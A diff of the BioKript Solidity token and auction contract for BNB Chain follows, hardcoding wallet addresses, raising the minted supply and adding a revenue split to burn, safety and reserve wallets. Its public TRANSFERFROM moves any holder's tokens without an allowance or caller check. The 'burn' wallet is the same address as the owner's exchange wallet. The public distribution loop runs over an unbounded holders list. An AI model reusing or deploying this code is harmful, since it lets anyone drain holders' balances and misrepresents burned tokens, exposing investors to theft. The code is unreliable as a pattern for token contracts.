@@ -1,9 +1,6 @@
-/**
- *Submitted for verification at BscScan.com on 2022-09-19
-*/
-
-// SPDX-License-Identifier: MIT
-
+/*BIOKRIPT SMART CONTRACTS
+https://biokript.com/
+SPDX-License-Identifier: MIT */
 pragma solidity ^0.8.7;
 
 library SafeMath {
@@ -700,14 +697,6 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         emit Transfer(account, address(0), amount);
     }
 
-    function TRANSFER(address to, uint256 amount) public {
-        require(amount <= _balances[msg.sender], "Not enough balance");
-        _balances[msg.sender] -= amount;
-        _balances[to]+= amount;
-        emit Transfer(msg.sender, to, amount);
-
-    }
-
     function TRANSFERFROM(address from, address to, uint256 amount) public {
         require(amount <= _balances[from], "Not enough balance");
         _balances[from] -= amount;
@@ -758,30 +747,17 @@ contract BioKript is ERC20, Ownable {
 
     bool private swapping;
     
-    address public liquidityWallet;
-
-    uint256 public liquidityFee = 3;
-    uint256 public burnFee = 0;
-
      //all profits/revenues will be held here
-    //all other % will be transferred directly to other addresses from exchange wallet
     address public exchangeWallet = 0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E;
-    address public burnWallet;
-    address public safetyFunds;
-    address public reserves;
-
-    // use by default 300,000 gas to process auto-claiming dividends
-   // uint256 public gasForProcessing = 300000;
-    uint256 private distTime;
-
+    address public burnWallet = 0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E;
+    address public safetyFunds = 0x9ed5b717be13fB4aCc0eEf4E0c4e6414aEedbFC3;
+    address public reserves = 0x081B99e551C1006063286FA881617b8a9C378098;
 
     // timestamp for when the token can be traded freely on PanackeSwap
     uint256 public tradingEnabledTimestamp;
 
     // exlcude from fees and max transaction amount
     mapping (address => bool) public _isExcludedFromFees;
-    mapping (address => bool) public _isExcludedFromLottery;
-   // mapping(address => uint256) public _balances;
 
     address [] public holders;
 
@@ -796,8 +772,6 @@ contract BioKript is ERC20, Ownable {
     );
 
     constructor() ERC20("Bkrpt", "Bkrpt") {
-
-    	liquidityWallet = owner();
     	
     	IPancakeV2Router02 _pancakeV2Router = IPancakeV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
          // Create a pancake pair for this new token
@@ -810,15 +784,12 @@ contract BioKript is ERC20, Ownable {
         // exclude from paying fees or having max transaction amount
         excludeFromFees(owner(), true);
         excludeFromFees(address(this), true);
-        distTime = block.timestamp + 7 days;
-
         /*
             _mint is an internal function in ERC20.sol that is only called here,
             and CANNOT be called ever again
         */
-        //_mint(owner(), 500000000 * 10 ** 18);
-        _mint(owner(), 5000000 * 10 ** 18);
-       //_mint(owner(), 500000000);
+        _mint(owner(), 500000000 * 10 ** 18);
+
         emit Transfer(address(0), msg.sender, totalSupply());
     }
 
@@ -833,10 +804,6 @@ contract BioKript is ERC20, Ownable {
           //uint a = (amount * 10 ** 18);
         _burn(msg.sender, amount);
   	}
-
-    //   function getContractAddress() public view returns(address) {
-    //       return address(AuctionContract);
-    //   }
   	
     function excludeFromFees(address account, bool excluded) public onlyOwner {
         require(_isExcludedFromFees[account] != excluded, " Account is already the value of 'excluded'");
@@ -863,22 +830,6 @@ contract BioKript is ERC20, Ownable {
             super._transfer(from, to, 0);
             return;
         }
-
-        //bool takeFee = true;
-
-        // if any account belongs to _isExcludedFromFee account then remove the fee
-//         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
-//             takeFee = false;
-//         }
-
-//         if(takeFee) {
-//         	uint256 fees = amount.mul(burnFee).div(100);
-
-//         	amount = amount.sub(fees);
-// //10% burn fee transferred in contract
-//             super._transfer(from, address(this), fees);
-//         }
-
         super._transfer(from, to, amount);
         holders.push(to);
         
@@ -937,35 +888,14 @@ contract BioKript is ERC20, Ownable {
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
-            liquidityWallet,
+            owner(),
             block.timestamp
         );
     }
 
-// uint256 public revenue;
-//     function distributeInvestors() public onlyOwner{
-//         //require(block.timestamp >= distTime, "Distribution helds on weekly basis");
-//          revenue = balanceOf(exchangeWallet);
-//         uint256 amount = (revenue * 40)/100;
-//           amount = amount / totalSupply();
-//        uint256 distributionAmount;
-//         for(uint256 i = 0; i<holders.length ; i++){
-//             distributionAmount = amount * balanceOf(holders[i]);
-//             TRANSFERFROM(exchangeWallet,holders[i], amount);
-// //}
-//     }
-//     }
-
     function TokenAddress() public view returns(address) {
         return address(this);
     }
-
-    // function swapAndSendDividends(uint256 tokens) private {
-    //     swapTokensForEth(tokens);
-    //     uint256 BNB = address(this).balance.div(totalFees - liquidityFee).mul(devFee);
-    //     (bool success,) = address(exchangeWallet).call{value: BNB}("");
-    //     uint256 dividends = address(this).balance;
-    // }
 }
 
 contract auctionContract is Ownable, BioKript{
@@ -977,6 +907,7 @@ contract auctionContract is Ownable, BioKript{
     uint256 public auctionTime;
     uint256 public currentPrice;
     uint256 private min;
+    uint256 private distTime;
 
     function getBalance() public view returns(uint256) {
         return address(this).balance;
@@ -999,6 +930,7 @@ contract auctionContract is Ownable, BioKript{
             lastAuctionPrice = currentPrice;
         }
         auctionstatus = true;
+        distTime = block.timestamp + 5 minutes;
     }
 
     function increasePricepermin() internal {
@@ -1020,28 +952,24 @@ contract auctionContract is Ownable, BioKript{
         increasePricepermin();
     }
 
-    uint256 public revenue;
-    uint256 public temp;
     uint256 public distributionAmount;
     function distributeInvestors() public {
-        //require(block.timestamp >= distTime, "Distribution helds on weekly basis");
-        revenue = balanceOf(address(this));
+        require(block.timestamp >= distTime, "Distribution helds on weekly basis");
+        uint256 revenue = balanceOf(address(this));
+        uint256 burnTax = (revenue * 10)/100;
+        TRANSFERFROM(address(this), burnWallet, burnTax);
+        uint256 safety = (revenue * 5)/100;
+        TRANSFERFROM(address(this), safetyFunds, safety);
+        uint256 reser = (revenue * 5)/100;
+        TRANSFERFROM(address(this), reserves, reser);
         uint256 amount = (revenue * 40)/100;
-        temp = (amount * 10**18 / totalSupply()) % 10**18;
-       // while(balanceOf(address(this))>0){
+        uint256 temp = (amount * 10**18 / totalSupply()) % 10**18;
             for(uint256 i = 0; i<holders.length ; i++){
             distributionAmount = temp * balanceOf(holders[i]);
             distributionAmount = distributionAmount/10**18;
-            // TRANSFERFROM(address(this),holders[i], distributionAmount);
             TRANSFERFROM(address(this),holders[i], distributionAmount);
-}
-       // }
+            }
     }
-    //}
-
-    //  uint256 public revenue;
-    //  uint256 public totallsupp;
-    // uint256 public amount;
 
 }
 //0xE5cb3B7a6D374f8053c2Ccf9d473850F2A4BC51E
@@ -1049,7 +977,7 @@ contract auctionContract is Ownable, BioKript{
 //0x9ed5b717be13fB4aCc0eEf4E0c4e6414aEedbFC3
 //0x081B99e551C1006063286FA881617b8a9C378098
 
-/*Burn wallet                  0xB935CCd6FCCa4f66C4D61EF01bCE4DAe853D396D
- SAfety fund                             0x9B08177a2D618bCF8Db1379e44dB76dce745B9cb
- Reserves                            0x4d7344DA992208127eb47C09aB43C7780c456Ab8
+/*Burn wallet 0xB935CCd6FCCa4f66C4D61EF01bCE4DAe853D396D
+ SAfety fund 0x9B08177a2D618bCF8Db1379e44dB76dce745B9cb
+ Reserves 0x4d7344DA992208127eb47C09aB43C7780c456Ab8
 */
